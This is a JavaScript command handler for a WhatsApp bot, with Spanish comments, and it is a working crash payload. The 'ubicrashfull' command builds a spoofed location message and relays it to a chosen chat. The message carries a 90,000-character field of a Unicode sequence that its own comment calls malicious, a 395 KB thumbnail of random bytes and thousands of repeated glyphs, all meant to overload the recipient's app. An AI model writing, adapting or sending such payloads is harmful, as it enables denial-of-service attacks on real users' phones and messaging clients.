let handler = async (m, { conn }) => {
  const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat;
  if (jid === conn.user.id) {
    return conn.sendMessage(m.chat, { text: '❌ No puedo enviármelo a mí mismo.' }, { quoted: m });
  }

  const objetivo = jid;

  // 🧨 Carácter Unicode malicioso
  const caracter = 'ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵';
  const address = caracter.repeat(Math.floor(90000 / caracter.length)).slice(0, 90000);

  // 🖼️ Thumbnail de 395 KB con bytes aleatorios
  const header = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]);
  const fill = Buffer.alloc(395 * 1024 - header.length);
  for (let i = 0; i < fill.length; i++) fill[i] = Math.floor(Math.random() * 256);
  const thumbnailPesado = Buffer.concat([header, fill]);

  // 📦 Construcción del mensaje con campos extra para peso
  const fakeLoc = {
    key: {
      fromMe: false,
      participant: "0@s.whatsapp.net",
      ...(m.chat ? { remoteJid: "status@broadcast" } : {})
    },
    message: {
      locationMessage: {
        name: 'Tobi',
        degreesLatitude: 19.432608,
        degreesLongitude: -99.133209,
        address: address,
        jpegThumbnail: thumbnailPesado,
        isLive: false,
        livePeriod: 999999999,
        accuracyInMeters: 99999,
        speedInMps: 500,
        degreesClockwiseFromMagneticNorth: 359,
        comment: '𑇂𑆿𑆿𑇂'.repeat(2000), // más bytes innecesarios

        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: ['1234567890@s.whatsapp.net'],
          externalAdReply: {
            title: '𑆿𑆿𑆿𑆿'.repeat(1000),
            body: '𑇂𑇂𑇂𑇂'.repeat(1000),
            thumbnail: thumbnailPesado,
            sourceUrl: 'https://youtube.com/@p.a.zinwebkkkkj'
          }
        }
      }
    }
  };

  await conn.relayMessage(objetivo, fakeLoc.message, { messageId: conn.generateMessageTag() });
};

handler.command = /^ubicrashfull$/i;
handler.owner = true;

export default handler;